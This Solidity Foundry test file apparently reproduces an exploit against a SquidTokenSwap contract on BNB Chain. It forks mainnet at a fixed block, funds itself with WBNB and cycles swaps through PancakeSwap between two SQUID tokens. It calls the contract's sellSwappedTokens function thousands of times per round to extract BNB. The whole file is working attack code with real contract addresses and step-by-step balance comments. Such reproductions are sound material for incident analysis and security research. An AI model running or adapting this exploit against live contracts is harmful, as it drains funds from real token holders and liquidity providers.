// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

import "@interface/IPancakeV3.sol";
import "@interface/IPancakeV2.sol";
import "@interface/IWBNB.sol";
import "@interface/IERC20.sol";

import "./ISquidTokenSwap.sol";

IWBNB constant WBNB = IWBNB(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);

contract SquidTest is Test {
    // USDT_WBNB
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IPancakeRouterV2 PANCAKE_V2_ROUTER =
        IPancakeRouterV2(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    IERC20 SQUID_1 = IERC20(0x87230146E138d3F296a9a77e497A2A83012e9Bc5);
    IERC20 SQUID_2 = IERC20(0xFAfb7581a65A1f554616Bf780fC8a8aCd2Ab8c9b);

    ISquidTokenSwap SquidTokenSwap =
        ISquidTokenSwap(0xd309f0Fd5C3b90ecFb7024eDe7D329d9582492c5);

    function setUp() public {
        vm.createSelectFork("bsc", 37672970 - 1);
        deal(address(WBNB), address(this), 10000 ether);
    }

    function print(string memory _txt, uint256 value, uint256 decimal) public {
        emit log_named_decimal_uint(_txt, value, decimal);
    }

    function testExploit() public {
        SQUID_1.approve(address(SquidTokenSwap), type(uint256).max);
        SQUID_2.approve(address(PANCAKE_V2_ROUTER), type(uint256).max);

        // BNB -> SQUID_1
        token2token(address(WBNB), address(SQUID_1), 7000 ether);
        // SQUID_1 -> SQUID_2
        SquidTokenSwap.swapTokens(SQUID_1.balanceOf(address(this)));
        // BNB -> SQUID_2
        token2token(address(WBNB), address(SQUID_2), 3000 ether);

        uint256 i = 0;
        while (i < 8000) {
            try SquidTokenSwap.sellSwappedTokens(0) {} catch {
                break;
            }
            i++;
        }

        for (uint256 loop = 0; loop < 4; loop++) {
            // SQUID_2 -> BNB
            token2token(
                address(SQUID_2),
                address(WBNB),
                SQUID_2.balanceOf(address(this))
            );

            // BNB: 10102.373736207533918420
            print("BNB", WBNB.balanceOf(address(this)), 18);

            // BNB -> SQUID_1
            token2token(address(WBNB), address(SQUID_1), 7000 ether);
            // SQUID_1: 4080_0468.854864108363625807

            SquidTokenSwap.swapTokens(SQUID_1.balanceOf(address(this)));

            // BNB -> SQUID_2
            token2token(address(WBNB), address(SQUID_2), 3000 ether);

            i = 0;
            while (i < 8000) {
                try SquidTokenSwap.sellSwappedTokens(0) {} catch {
                    break;
                }
                i++;
            }
        }

        // SQUID_2 -> BNB
        token2token(
            address(SQUID_2),
            address(WBNB),
            SQUID_2.balanceOf(address(this))
        );
    }

    function token2token(address a, address b, uint256 amount) internal {
        IERC20(a).approve(address(PANCAKE_V2_ROUTER), amount);

        address[] memory path = new address[](2);
        path[0] = address(a);
        path[1] = address(b);

        PANCAKE_V2_ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                amount,
                0,
                path,
                address(this),
                block.timestamp
            );
    }
}
